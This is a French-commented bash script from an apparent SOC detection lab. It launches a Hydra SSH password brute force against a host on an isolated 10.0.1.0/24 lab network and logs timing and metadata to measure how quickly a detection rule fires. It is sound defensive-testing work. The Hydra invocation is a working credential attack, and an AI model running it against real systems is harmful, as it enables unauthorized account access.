#!/usr/bin/env bash
#
# run_s1_ssh_bruteforce.sh — Scénario S1 : Brute-force SSH (NyxSOC)
#
# Lance Hydra contre le serveur cible sur le réseau labo isolé (10.0.1.0/24),
# avec un débit modéré et réaliste (~10-50 tentatives/min visé), et journalise
# précisément l'heure de début/fin pour pouvoir calculer ensuite la latence
# de détection du moteur (timestamp alerte - timestamp premier événement).
#
# Prérequis :
#   - Kali sur le réseau nyx (10.0.1.50), route directe vers 10.0.1.20
#   - wordlist_s1.txt générée via gen_wordlist.py (compte à côté, non commit)
#   - hydra installé (par défaut sur Kali)
#
# Usage :
#   ./ssh_bruteforce.sh <target_ip> <ssh_user> <wordlist_file>
#
# Exemple :
#   ./ssh_bruteforce.sh 10.0.1.20 server wordlist_s1.txt

set -euo pipefail

TARGET="${1:-10.0.1.20}"
USER="${2:-server}"
WORDLIST="${3:-wordlist_s1.txt}"

# Threads modérés pour rester dans la fourchette documentée (10-50 tentatives/min)
# -t 4 : 4 tâches paralleles, pas de saturation VM cible (1.5 Go RAM / 2 vCPU)
THREADS=4

LOGDIR="./logs"
mkdir -p "$LOGDIR"

TS_START=$(date -u +"%Y-%m-%dT%H:%M:%S.%3NZ")
TS_START_EPOCH=$(date +%s.%N)
RUN_ID="s1_$(date +%Y%m%d_%H%M%S)"
LOGFILE="${LOGDIR}/${RUN_ID}.log"
METAFILE="${LOGDIR}/${RUN_ID}.meta.json"

if [ ! -f "$WORDLIST" ]; then
    echo "[!] Wordlist introuvable : $WORDLIST"
    echo "    Génère-la d'abord avec gen_wordlist.py"
    exit 1
fi

echo "=================================================="
echo " NyxSOC — Scénario S1 : Brute-force SSH"
echo "=================================================="
echo " Cible       : ${TARGET}"
echo " Utilisateur : ${USER}"
echo " Wordlist    : ${WORDLIST} ($(wc -l < "$WORDLIST") entrées)"
echo " Threads     : ${THREADS}"
echo " Début (UTC) : ${TS_START}"
echo " Run ID      : ${RUN_ID}"
echo "=================================================="

# Vérification de connectivité avant l'attaque
if ! ping -c 1 -W 2 "$TARGET" > /dev/null 2>&1; then
    echo "[!] Cible ${TARGET} injoignable. Vérifier le réseau nyx."
    exit 1
fi

# Lancement Hydra : sortie brute loggée, timing capturé autour de l'appel
hydra -l "$USER" -P "$WORDLIST" -t "$THREADS" -f -o "$LOGFILE" "ssh://${TARGET}" \
    | tee -a "$LOGFILE"

TS_END=$(date -u +"%Y-%m-%dT%H:%M:%S.%3NZ")
TS_END_EPOCH=$(date +%s.%N)
# Calcul de durée sans dépendance à `bc` (non installé par défaut sur Kali) :
# awk gère les flottants nativement.
DURATION=$(awk -v a="$TS_START_EPOCH" -v b="$TS_END_EPOCH" 'BEGIN{printf "%.3f", b-a}')

# Métadonnées de la run, utiles pour le dataset (labeled/eval) et le calcul
# de la latence de détection (Phase 8.2 du protocole d'évaluation)
cat > "$METAFILE" <<EOF
{
  "scenario": "S1_SSH_BRUTEFORCE",
  "run_id": "${RUN_ID}",
  "target_ip": "${TARGET}",
  "actor_ip": "10.0.1.50",
  "ssh_user": "${USER}",
  "threads": ${THREADS},
  "wordlist_size": $(wc -l < "$WORDLIST"),
  "ts_start_utc": "${TS_START}",
  "ts_end_utc": "${TS_END}",
  "duration_seconds": ${DURATION},
  "expected_rule": "SSH_BRUTEFORCE_001",
  "mitre": "T1110"
}
EOF

echo "=================================================="
echo " Fin (UTC)     : ${TS_END}"
echo " Durée         : ${DURATION}s"
echo " Log complet   : ${LOGFILE}"
echo " Métadonnées   : ${METAFILE}"
echo "=================================================="
echo "[+] Terminé. Vérifie /var/log/auth.log sur ${TARGET} pour les entrées Failed password."